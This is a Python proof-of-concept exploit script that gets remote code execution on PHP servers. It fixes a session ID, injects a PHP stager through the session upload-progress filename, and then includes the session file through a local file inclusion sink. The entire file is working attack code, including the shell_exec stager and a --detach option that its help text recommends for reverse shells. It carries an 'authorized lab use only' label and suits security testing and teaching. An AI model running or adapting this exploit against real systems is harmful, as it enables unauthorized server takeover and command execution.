#!/usr/bin/env python3
"""
php2shell-poc — session injection via session.upload_progress chained into an LFI sink.

Authorized lab use only. Verified against a local Docker lab.

The chain:
  1. Fixate PHPSESSID via a multipart form field (requires session.use_only_cookies = 0),
     so the session filename on disk is known: <session.save_path>/sess_<sid>
  2. POST the reserved field PHP_SESSION_UPLOAD_PROGRESS with a filename containing PHP
     code. PHP's request-startup upload-progress handler records the filename into the
     session store before application code runs.
  3. Include the session file through any LFI sink in the app.

Executed commands run as the web server user (e.g. www-data), not root.

Exit codes: 0 confirmed, 1 not confirmed, 2 usage/network error.
"""

import argparse
import json
import os
import re
import socket
import sys
import time
import urllib.parse

MARKER_START = "___START___"
MARKER_END = "___END___"
MARKER_RE = re.compile(r"(?s)___START___(.*?)___END___")


class Target:
    def __init__(self, raw, inject_path, lfi_path, timeout):
        url = urllib.parse.urlsplit(raw)
        if url.scheme not in ("http", "https"):
            raise ValueError(f"unsupported scheme: {url.scheme!r} (use http:// or https://)")
        if not url.hostname:
            raise ValueError("target URL has no host")
        self.tls = url.scheme == "https"
        self.host = url.hostname
        self.port = url.port or (443 if self.tls else 80)
        self.timeout = max(0.5, min(float(timeout), 120.0))
        self.inject_path = url.path if inject_path is None and url.path else (inject_path or "/index.php")
        self.lfi_path = lfi_path or "/vuln.php"

    def connect(self):
        sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        sock.settimeout(self.timeout)
        if self.tls:
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def send(self, raw):
        sock = self.connect()
        try:
            sock.sendall(raw)
            chunks = []
            total = 0
            limit = 1 << 20
            while total < limit:
                try:
                    chunk = sock.recv(65536)
                except (socket.timeout, ConnectionResetError, OSError):
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                total += len(chunk)
            return b"".join(chunks)
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def post_multipart(self, parts, boundary, extra_headers=None):
        body = build_multipart(parts, boundary)
        head = (
            f"POST {self.inject_path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Cookie: PHPSESSID={parts[0][2].decode('latin-1')}\r\n"
            f"Connection: close\r\n"
        )
        for key, value in (extra_headers or {}).items():
            head += f"{key}: {value}\r\n"
        return self.send(head.encode() + b"\r\n" + body)

    def get(self, path):
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        return self.send(raw)


def build_multipart(parts, boundary):
    out = bytearray()
    for name, filename, data in parts:
        out += f"--{boundary}\r\n".encode()
        if filename is not None:
            out += (
                f'Content-Disposition: form-data; name="{name}"; '
                f'filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode("latin-1")
        else:
            out += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        out += data + b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return bytes(out)


def status_code(resp):
    try:
        first = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        return int(first.split()[1])
    except (IndexError, ValueError):
        return 0


def body_of(resp):
    marker = b"\r\n\r\n"
    idx = resp.find(marker)
    return resp[idx + len(marker):] if idx != -1 else resp


def session_file(session_path, sid):
    return session_path.rstrip("/") + "/sess_" + sid


def sql_quote(value):
    return value.replace("\\", "\\\\").replace("'", "\\'")


STAGER = "<?php if(isset($_GET['c'])){echo '<<<'.shell_exec(base64_decode($_GET['c'])).'>>>';}?>"

def php_payload(command):
    # Stager payload is short and fixed-length, so it never truncates in the
    # session filename. The real command is delivered via ?c= in the LFI URL.
    return STAGER

def b64_cmd(command):
    import base64
    return base64.b64encode(command.encode()).decode()


def detach_cmd(command):
    # Wrap a command so it survives the Apache worker being reaped after the
    # HTTP request completes. setsid() creates a new session, and redirecting
    # stdio prevents the process from blocking on the (now-closed) socket.
    return f"(setsid {command} </dev/null >/dev/null 2>&1 &)"


def make_sid(attempt):
    entropy = os.urandom(12).hex()
    return f"php2shellpoc{attempt:02d}{entropy}"


def plant(target, sid, payload):
    boundary = "php2shellpocboundary"
    parts = [
        ("PHPSESSID", None, sid.encode()),
        ("PHP_SESSION_UPLOAD_PROGRESS", None, b"php2shell"),
        ("f", payload, b"Z"),
    ]
    resp = target.post_multipart(parts, boundary)
    return status_code(resp), len(resp)


def trigger(target, sess_path, sid, command=None):
    quoted = urllib.parse.quote(sess_path, safe="/:")
    if command:
        import base64
        c = base64.b64encode(command.encode()).decode()
        resp = target.get(f"{target.lfi_path}?page={quoted}&c={c}")
    else:
        resp = target.get(f"{target.lfi_path}?page={quoted}")
    return status_code(resp), body_of(resp)


def run(args):
    target = Target(args.target, args.inject_path, args.lfi_path, args.timeout)
    payload = php_payload(args.command)
    log = []

    effective_cmd = detach_cmd(args.command) if getattr(args, "detach", False) else args.command
    encoded = b64_cmd(effective_cmd)
    for attempt in range(1, max(1, args.attempts) + 1):
        sid = args.sid or make_sid(attempt)
        sess_path = session_file(args.session_path, sid)

        code, size = plant(target, sid, payload)
        log.append(f"attempt {attempt}: planted sid={sid} status={code} bytes={size} file={sess_path}")

        quoted = urllib.parse.quote(sess_path, safe="/:")
        lfi_url = f"{target.lfi_path}?page={quoted}&c={encoded}"
        resp = target.get(lfi_url)
        lfi_status = status_code(resp)
        body = body_of(resp)
        text = body.decode("latin-1", "replace")
        log.append(f"attempt {attempt}: lfi status={lfi_status}")

        # Stager echoes command output directly
        import re as _re
        m = _re.search(r"<<<(.*)>>>", text, _re.DOTALL)
        if m:
            stripped = m.group(1).strip()
            # Empty output is valid (e.g. redirect commands produce no stdout)
            return {
                "target": args.target,
                "command": args.command,
                "confirmed": True,
                "output": stripped,
                "attempts": attempt,
                "log": log,
            }
        stripped = ""
        if lfi_status == 200 and stripped:
            return {
                "target": args.target,
                "command": args.command,
                "confirmed": True,
                "output": stripped,
                "attempts": attempt,
                "log": log,
            }

        if lfi_status in (0, 404):
            log.append(f"attempt {attempt}: LFI endpoint unreachable ({lfi_status}); check --lfi-path")

    return {
        "target": args.target,
        "command": args.command,
        "confirmed": False,
        "output": "",
        "attempts": max(1, args.attempts),
        "log": log,
    }


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        prog="php2shell-poc.py",
        description="Session-injection + LFI PoC (authorized lab use only).",
    )
    parser.add_argument("--target", required=True, help="URL of an endpoint that starts a session")
    parser.add_argument("--inject-path", default=None, help="upload endpoint (default: target path)")
    parser.add_argument("--lfi-path", default="/vuln.php", help="include sink that reads the session file")
    parser.add_argument("--session-path", default="/tmp", help="target session.save_path")
    parser.add_argument("--command", default="id", help="system command to run")
    parser.add_argument("--attempts", type=int, default=3, help="retry count")
    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (max 120)")
    parser.add_argument("--sid", default=None, help="fixed session id")
    parser.add_argument("--detach", action="store_true",
                        help="detach the command with setsid so it survives Apache worker reaping (use for reverse shells)")
    parser.add_argument("--json", action="store_true", help="structured output")
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    if not (0 < args.timeout <= 120):
        print("--timeout must be greater than 0 and at most 120 seconds", file=sys.stderr)
        return 2
    try:
        result = run(args)
    except (ValueError, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    if args.json:
        print(json.dumps(result, indent=2, sort_keys=True))
    else:
        for line in result["log"]:
            print(f"[*] {line}", file=sys.stderr)
        if result["confirmed"]:
            print(f"RCE CONFIRMED: {result['output']}")
        else:
            print("NOT CONFIRMED: no marker found in LFI response")
    return 0 if result["confirmed"] else 1


if __name__ == "__main__":
    sys.exit(main())
